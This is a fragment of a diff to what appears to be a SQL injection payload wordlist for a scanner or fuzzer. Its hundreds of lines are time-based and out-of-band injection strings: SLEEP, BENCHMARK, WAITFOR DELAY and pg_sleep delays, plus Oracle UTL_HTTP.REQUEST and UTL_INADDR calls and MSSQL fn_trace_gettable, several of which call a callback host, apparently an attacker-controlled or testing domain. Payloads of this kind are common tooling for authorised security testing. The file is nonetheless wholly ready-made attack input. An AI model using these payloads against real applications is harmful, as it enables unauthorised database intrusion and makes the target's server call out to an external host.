+'+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')  -- 
+'+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') /* 
+'+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))  -- 
+'+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')) /* 
+'+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))  -- 
+'+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))) /* 
+'+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))))  -- 
+'+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))) /* 
+'||BENCHMARK(1000000,MD5('A'))  -- 
+'||BENCHMARK(1000000,MD5('A')) /* 
+'||BENCHMARK(1000000,MD5('A')))  -- 
+'||BENCHMARK(1000000,MD5('A'))) /* 
+'||BENCHMARK(1000000,MD5('A'))))  -- 
+'||BENCHMARK(1000000,MD5('A')))) /* 
+'||BENCHMARK(1000000,MD5('A')))))  -- 
+'||BENCHMARK(1000000,MD5('A'))))) /* 
+'||SLEEP(10)  -- 
+'||SLEEP(10) /* 
+'||SLEEP(10))  -- 
+'||SLEEP(10)) /* 
+'||SLEEP(10)))  -- 
+'||SLEEP(10))) /* 
+'||SLEEP(10))))  -- 
+'||SLEEP(10)))) /* 
+'||WAITFOR DELAY '00:00:10'  -- 
+'||WAITFOR DELAY '00:00:10' /* 
+'||WAITFOR DELAY '00:00:10')  -- 
+'||WAITFOR DELAY '00:00:10') /* 
+'||WAITFOR DELAY '00:00:10'))  -- 
+'||WAITFOR DELAY '00:00:10')) /* 
+'||WAITFOR DELAY '00:00:10')))  -- 
+'||WAITFOR DELAY '00:00:10'))) /* 
+'||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))  -- 
+'||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)) /* 
+'||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))  -- 
+'||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))) /* 
+'||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))  -- 
+'||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))) /* 
+'||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))))  -- 
+'||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))) /* 
+'||pg_sleep(10) is not null  -- 
+'||pg_sleep(10) is not null /* 
+'||pg_sleep(10) is not null)  -- 
+'||pg_sleep(10) is not null) /* 
+'||pg_sleep(10) is not null))  -- 
+'||pg_sleep(10) is not null)) /* 
+'||pg_sleep(10) is not null)))  -- 
+'||pg_sleep(10) is not null))) /* 
+'||UTL_INADDR.get_host_name('10.0.0.1')  -- 
+'||UTL_INADDR.get_host_name('10.0.0.1') /* 
+'||UTL_INADDR.get_host_name('10.0.0.1'))  -- 
+'||UTL_INADDR.get_host_name('10.0.0.1')) /* 
+'||UTL_INADDR.get_host_name('10.0.0.1')))  -- 
+'||UTL_INADDR.get_host_name('10.0.0.1'))) /* 
+'||UTL_INADDR.get_host_name('10.0.0.1'))))  -- 
+'||UTL_INADDR.get_host_name('10.0.0.1')))) /* 
+'||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')  -- 
+'||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') /* 
+'||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))  -- 
+'||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')) /* 
+'||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))  -- 
+'||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))) /* 
+'||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))))  -- 
+'||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))) /* 
+'||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')  -- 
+'||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') /* 
+'||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))  -- 
+'||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')) /* 
+'||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))  -- 
+'||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))) /* 
+'||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))))  -- 
+'||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))) /* 
+' and BENCHMARK(1000000,MD5('A'))  -- 
+' and BENCHMARK(1000000,MD5('A')) /* 
+' and BENCHMARK(1000000,MD5('A')))  -- 
+' and BENCHMARK(1000000,MD5('A'))) /* 
+' and BENCHMARK(1000000,MD5('A'))))  -- 
+' and BENCHMARK(1000000,MD5('A')))) /* 
+' and BENCHMARK(1000000,MD5('A')))))  -- 
+' and BENCHMARK(1000000,MD5('A'))))) /* 
+' and SLEEP(10)  -- 
+' and SLEEP(10) /* 
+' and SLEEP(10))  -- 
+' and SLEEP(10)) /* 
+' and SLEEP(10)))  -- 
+' and SLEEP(10))) /* 
+' and SLEEP(10))))  -- 
+' and SLEEP(10)))) /* 
+' and WAITFOR DELAY '00:00:10'  -- 
+' and WAITFOR DELAY '00:00:10' /* 
+' and WAITFOR DELAY '00:00:10')  -- 
+' and WAITFOR DELAY '00:00:10') /* 
+' and WAITFOR DELAY '00:00:10'))  -- 
+' and WAITFOR DELAY '00:00:10')) /* 
+' and WAITFOR DELAY '00:00:10')))  -- 
+' and WAITFOR DELAY '00:00:10'))) /* 
+' and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))  -- 
+' and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)) /* 
+' and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))  -- 
+' and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))) /* 
+' and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))  -- 
+' and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))) /* 
+' and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))))  -- 
+' and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))) /* 
+' and pg_sleep(10) is not null  -- 
+' and pg_sleep(10) is not null /* 
+' and pg_sleep(10) is not null)  -- 
+' and pg_sleep(10) is not null) /* 
+' and pg_sleep(10) is not null))  -- 
+' and pg_sleep(10) is not null)) /* 
+' and pg_sleep(10) is not null)))  -- 
+' and pg_sleep(10) is not null))) /* 
+' and UTL_INADDR.get_host_name('10.0.0.1')  -- 
+' and UTL_INADDR.get_host_name('10.0.0.1') /* 
+' and UTL_INADDR.get_host_name('10.0.0.1'))  -- 
+' and UTL_INADDR.get_host_name('10.0.0.1')) /* 
+' and UTL_INADDR.get_host_name('10.0.0.1')))  -- 
+' and UTL_INADDR.get_host_name('10.0.0.1'))) /* 
+' and UTL_INADDR.get_host_name('10.0.0.1'))))  -- 
+' and UTL_INADDR.get_host_name('10.0.0.1')))) /* 
+' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')  -- 
+' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') /* 
+' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))  -- 
+' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')) /* 
+' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))  -- 
+' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))) /* 
+' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))))  -- 
+' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))) /* 
+' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')  -- 
+' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') /* 
+' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))  -- 
+' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')) /* 
+' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))  -- 
+' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))) /* 
+' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))))  -- 
+' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))) /* 
+"+BENCHMARK(1000000,MD5('A'))  -- 
+"+BENCHMARK(1000000,MD5('A')) /* 
+"+BENCHMARK(1000000,MD5('A')))  -- 
+"+BENCHMARK(1000000,MD5('A'))) /* 
+"+BENCHMARK(1000000,MD5('A'))))  -- 
+"+BENCHMARK(1000000,MD5('A')))) /* 
 "+BENCHMARK(1000000,MD5('A')))))  -- 
 "+BENCHMARK(1000000,MD5('A'))))) /* 
-"+SLEEP(10)   -- 
-"+SLEEP(10)  /* 
-"+SLEEP(10))   -- 
-"+SLEEP(10))  /* 
-"+SLEEP(10)))   -- 
-"+SLEEP(10)))  /* 
+"+SLEEP(10)  -- 
+"+SLEEP(10) /* 
+"+SLEEP(10))  -- 
+"+SLEEP(10)) /* 
+"+SLEEP(10)))  -- 
+"+SLEEP(10))) /* 
 "+SLEEP(10))))  -- 
 "+SLEEP(10)))) /* 
-"+WAITFOR DELAY '00:00:10'   -- 
-"+WAITFOR DELAY '00:00:10'  /* 
-"+WAITFOR DELAY '00:00:10')   -- 
-"+WAITFOR DELAY '00:00:10')  /* 
-"+WAITFOR DELAY '00:00:10'))   -- 
-"+WAITFOR DELAY '00:00:10'))  /* 
+"+WAITFOR DELAY '00:00:10'  -- 
+"+WAITFOR DELAY '00:00:10' /* 
+"+WAITFOR DELAY '00:00:10')  -- 
+"+WAITFOR DELAY '00:00:10') /* 
+"+WAITFOR DELAY '00:00:10'))  -- 
+"+WAITFOR DELAY '00:00:10')) /* 
 "+WAITFOR DELAY '00:00:10')))  -- 
 "+WAITFOR DELAY '00:00:10'))) /* 
-"+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))   -- 
-"+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))  /* 
-"+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))   -- 
-"+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))  /* 
-"+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))   -- 
-"+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))  /* 
+"+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))  -- 
+"+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)) /* 
+"+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))  -- 
+"+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))) /* 
+"+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))  -- 
+"+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))) /* 
 "+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))))  -- 
 "+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))) /* 
-"+pg_sleep(10) is not null   -- 
-"+pg_sleep(10) is not null  /* 
-"+pg_sleep(10) is not null)   -- 
-"+pg_sleep(10) is not null)  /* 
-"+pg_sleep(10) is not null))   -- 
-"+pg_sleep(10) is not null))  /* 
+"+pg_sleep(10) is not null  -- 
+"+pg_sleep(10) is not null /* 
+"+pg_sleep(10) is not null)  -- 
+"+pg_sleep(10) is not null) /* 
+"+pg_sleep(10) is not null))  -- 
+"+pg_sleep(10) is not null)) /* 
 "+pg_sleep(10) is not null)))  -- 
 "+pg_sleep(10) is not null))) /* 
-"+UTL_INADDR.get_host_name('10.0.0.1')   -- 
-"+UTL_INADDR.get_host_name('10.0.0.1')  /* 
-"+UTL_INADDR.get_host_name('10.0.0.1'))   -- 
-"+UTL_INADDR.get_host_name('10.0.0.1'))  /* 
-"+UTL_INADDR.get_host_name('10.0.0.1')))   -- 
-"+UTL_INADDR.get_host_name('10.0.0.1')))  /* 
+"+UTL_INADDR.get_host_name('10.0.0.1')  -- 
+"+UTL_INADDR.get_host_name('10.0.0.1') /* 
+"+UTL_INADDR.get_host_name('10.0.0.1'))  -- 
+"+UTL_INADDR.get_host_name('10.0.0.1')) /* 
+"+UTL_INADDR.get_host_name('10.0.0.1')))  -- 
+"+UTL_INADDR.get_host_name('10.0.0.1'))) /* 
 "+UTL_INADDR.get_host_name('10.0.0.1'))))  -- 
 "+UTL_INADDR.get_host_name('10.0.0.1')))) /* 
-"+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')   -- 
-"+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')  /* 
-"+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))   -- 
-"+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))  /* 
-"+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))   -- 
-"+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))  /* 
+"+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')  -- 
+"+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') /* 
+"+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))  -- 
+"+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')) /* 
+"+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))  -- 
+"+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))) /* 
 "+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))))  -- 
 "+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))) /* 
-"+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')   -- 
-"+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')  /* 
-"+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))   -- 
-"+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))  /* 
-"+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))   -- 
-"+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))  /* 
+"+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')  -- 
+"+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') /* 
+"+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))  -- 
+"+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')) /* 
+"+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))  -- 
+"+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))) /* 
 "+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))))  -- 
 "+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))) /* 
+"||BENCHMARK(1000000,MD5('A'))  -- 
+"||BENCHMARK(1000000,MD5('A')) /* 
+"||BENCHMARK(1000000,MD5('A')))  -- 
+"||BENCHMARK(1000000,MD5('A'))) /* 
+"||BENCHMARK(1000000,MD5('A'))))  -- 
+"||BENCHMARK(1000000,MD5('A')))) /* 
+"||BENCHMARK(1000000,MD5('A')))))  -- 
+"||BENCHMARK(1000000,MD5('A'))))) /* 
+"||SLEEP(10)  -- 
+"||SLEEP(10) /* 
+"||SLEEP(10))  -- 
+"||SLEEP(10)) /* 
+"||SLEEP(10)))  -- 
+"||SLEEP(10))) /* 
+"||SLEEP(10))))  -- 
+"||SLEEP(10)))) /* 
+"||WAITFOR DELAY '00:00:10'  -- 
+"||WAITFOR DELAY '00:00:10' /* 
+"||WAITFOR DELAY '00:00:10')  -- 
+"||WAITFOR DELAY '00:00:10') /* 
+"||WAITFOR DELAY '00:00:10'))  -- 
+"||WAITFOR DELAY '00:00:10')) /* 
+"||WAITFOR DELAY '00:00:10')))  -- 
+"||WAITFOR DELAY '00:00:10'))) /* 
+"||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))  -- 
+"||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)) /* 
+"||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))  -- 
+"||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))) /* 
+"||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))  -- 
+"||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))) /* 
+"||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))))  -- 
+"||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))) /* 
+"||pg_sleep(10) is not null  -- 
+"||pg_sleep(10) is not null /* 
+"||pg_sleep(10) is not null)  -- 
+"||pg_sleep(10) is not null) /* 
+"||pg_sleep(10) is not null))  -- 
+"||pg_sleep(10) is not null)) /* 
+"||pg_sleep(10) is not null)))  -- 
+"||pg_sleep(10) is not null))) /* 
+"||UTL_INADDR.get_host_name('10.0.0.1')  -- 
+"||UTL_INADDR.get_host_name('10.0.0.1') /* 
+"||UTL_INADDR.get_host_name('10.0.0.1'))  -- 
+"||UTL_INADDR.get_host_name('10.0.0.1')) /* 
+"||UTL_INADDR.get_host_name('10.0.0.1')))  -- 
+"||UTL_INADDR.get_host_name('10.0.0.1'))) /* 
+"||UTL_INADDR.get_host_name('10.0.0.1'))))  -- 
+"||UTL_INADDR.get_host_name('10.0.0.1')))) /* 
+"||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')  -- 
+"||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') /* 
+"||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))  -- 
+"||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')) /* 
+"||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))  -- 
+"||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))) /* 
+"||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))))  -- 
+"||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))) /* 
+"||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')  -- 
+"||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') /* 
+"||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))  -- 
+"||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')) /* 
+"||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))  -- 
+"||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))) /* 
+"||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))))  -- 
+"||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))) /* 
+" and BENCHMARK(1000000,MD5('A'))  -- 
+" and BENCHMARK(1000000,MD5('A')) /* 
+" and BENCHMARK(1000000,MD5('A')))  -- 
+" and BENCHMARK(1000000,MD5('A'))) /* 
+" and BENCHMARK(1000000,MD5('A'))))  -- 
+" and BENCHMARK(1000000,MD5('A')))) /* 
+" and BENCHMARK(1000000,MD5('A')))))  -- 
+" and BENCHMARK(1000000,MD5('A'))))) /* 
+" and SLEEP(10)  -- 
+" and SLEEP(10) /* 
+" and SLEEP(10))  -- 
+" and SLEEP(10)) /* 
+" and SLEEP(10)))  -- 
+" and SLEEP(10))) /* 
+" and SLEEP(10))))  -- 
+" and SLEEP(10)))) /* 
+" and WAITFOR DELAY '00:00:10'  -- 
+" and WAITFOR DELAY '00:00:10' /* 
+" and WAITFOR DELAY '00:00:10')  -- 
+" and WAITFOR DELAY '00:00:10') /* 
+" and WAITFOR DELAY '00:00:10'))  -- 
+" and WAITFOR DELAY '00:00:10')) /* 
+" and WAITFOR DELAY '00:00:10')))  -- 
+" and WAITFOR DELAY '00:00:10'))) /* 
+" and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))  -- 
+" and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)) /* 
+" and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))  -- 
+" and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))) /* 
+" and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))  -- 
+" and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))) /* 
+" and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))))  -- 
+" and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))) /* 
+" and pg_sleep(10) is not null  -- 
+" and pg_sleep(10) is not null /* 
+" and pg_sleep(10) is not null)  -- 
+" and pg_sleep(10) is not null) /* 
+" and pg_sleep(10) is not null))  -- 
+" and pg_sleep(10) is not null)) /* 
+" and pg_sleep(10) is not null)))  -- 
+" and pg_sleep(10) is not null))) /* 
+" and UTL_INADDR.get_host_name('10.0.0.1')  -- 
+" and UTL_INADDR.get_host_name('10.0.0.1') /* 
+" and UTL_INADDR.get_host_name('10.0.0.1'))  -- 
+" and UTL_INADDR.get_host_name('10.0.0.1')) /* 
+" and UTL_INADDR.get_host_name('10.0.0.1')))  -- 
+" and UTL_INADDR.get_host_name('10.0.0.1'))) /* 
+" and UTL_INADDR.get_host_name('10.0.0.1'))))  -- 
+" and UTL_INADDR.get_host_name('10.0.0.1')))) /* 
+" and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')  -- 
+" and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') /* 
+" and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))  -- 
+" and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')) /* 
+" and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))  -- 
+" and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))) /* 
+" and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))))  -- 
+" and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))) /* 
+" and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')  -- 
+" and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') /* 
+" and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))  -- 
+" and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')) /* 
+" and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))  -- 
+" and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))) /* 
+" and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))))  -- 
+" and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))) /* 
 ' and BENCHMARK(1000000,MD5('A')) and '1'='a
 ' and SLEEP(10) and '1'='a
 ' and WAITFOR DELAY '00:00:10' and '1'='a
@@ -238,78 +702,6 @@
 ' and UTL_INADDR.get_host_name('10.0.0.1') and '1'='a
 ' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') and '1'='a
 ' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') and '1'='a
-') and BENCHMARK(1000000,MD5('A')) and ('1'='a
-') and SLEEP(10) and ('1'='a
-') and WAITFOR DELAY '00:00:10' and ('1'='a
-') and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)) and ('1'='a
-') and pg_sleep(10) is not null and ('1'='a
-') and UTL_INADDR.get_host_name('10.0.0.1') and ('1'='a
-') and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') and ('1'='a
-') and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') and ('1'='a
-' and BENCHMARK(1000000,MD5('A'))   -- 
-' and BENCHMARK(1000000,MD5('A'))  /* 
-' and BENCHMARK(1000000,MD5('A')))   -- 
-' and BENCHMARK(1000000,MD5('A')))  /* 
-' and BENCHMARK(1000000,MD5('A'))))   -- 
-' and BENCHMARK(1000000,MD5('A'))))  /* 
-' and BENCHMARK(1000000,MD5('A')))))  -- 
-' and BENCHMARK(1000000,MD5('A'))))) /* 
-' and SLEEP(10)   -- 
-' and SLEEP(10)  /* 
-' and SLEEP(10))   -- 
-' and SLEEP(10))  /* 
-' and SLEEP(10)))   -- 
-' and SLEEP(10)))  /* 
-' and SLEEP(10))))  -- 
-' and SLEEP(10)))) /* 
-' and WAITFOR DELAY '00:00:10'   -- 
-' and WAITFOR DELAY '00:00:10'  /* 
-' and WAITFOR DELAY '00:00:10')   -- 
-' and WAITFOR DELAY '00:00:10')  /* 
-' and WAITFOR DELAY '00:00:10'))   -- 
-' and WAITFOR DELAY '00:00:10'))  /* 
-' and WAITFOR DELAY '00:00:10')))  -- 
-' and WAITFOR DELAY '00:00:10'))) /* 
-' and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))   -- 
-' and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))  /* 
-' and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))   -- 
-' and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))  /* 
-' and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))   -- 
-' and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))  /* 
-' and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))))  -- 
-' and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))) /* 
-' and pg_sleep(10) is not null   -- 
-' and pg_sleep(10) is not null  /* 
-' and pg_sleep(10) is not null)   -- 
-' and pg_sleep(10) is not null)  /* 
-' and pg_sleep(10) is not null))   -- 
-' and pg_sleep(10) is not null))  /* 
-' and pg_sleep(10) is not null)))  -- 
-' and pg_sleep(10) is not null))) /* 
-' and UTL_INADDR.get_host_name('10.0.0.1')   -- 
-' and UTL_INADDR.get_host_name('10.0.0.1')  /* 
-' and UTL_INADDR.get_host_name('10.0.0.1'))   -- 
-' and UTL_INADDR.get_host_name('10.0.0.1'))  /* 
-' and UTL_INADDR.get_host_name('10.0.0.1')))   -- 
-' and UTL_INADDR.get_host_name('10.0.0.1')))  /* 
-' and UTL_INADDR.get_host_name('10.0.0.1'))))  -- 
-' and UTL_INADDR.get_host_name('10.0.0.1')))) /* 
-' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')   -- 
-' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')  /* 
-' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))   -- 
-' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))  /* 
-' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))   -- 
-' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))  /* 
-' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))))  -- 
-' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))) /* 
-' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')   -- 
-' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')  /* 
-' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))   -- 
-' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))  /* 
-' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))   -- 
-' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))  /* 
-' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))))  -- 
-' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))) /* 
 " and BENCHMARK(1000000,MD5('A')) and "1"="a
 " and SLEEP(10) and "1"="a
 " and WAITFOR DELAY '00:00:10' and "1"="a
@@ -318,6 +710,14 @@
 " and UTL_INADDR.get_host_name('10.0.0.1') and "1"="a
 " and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') and "1"="a
 " and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') and "1"="a
+') and BENCHMARK(1000000,MD5('A')) and ('1'='a
+') and SLEEP(10) and ('1'='a
+') and WAITFOR DELAY '00:00:10' and ('1'='a
+') and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)) and ('1'='a
+') and pg_sleep(10) is not null and ('1'='a
+') and UTL_INADDR.get_host_name('10.0.0.1') and ('1'='a
+') and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') and ('1'='a
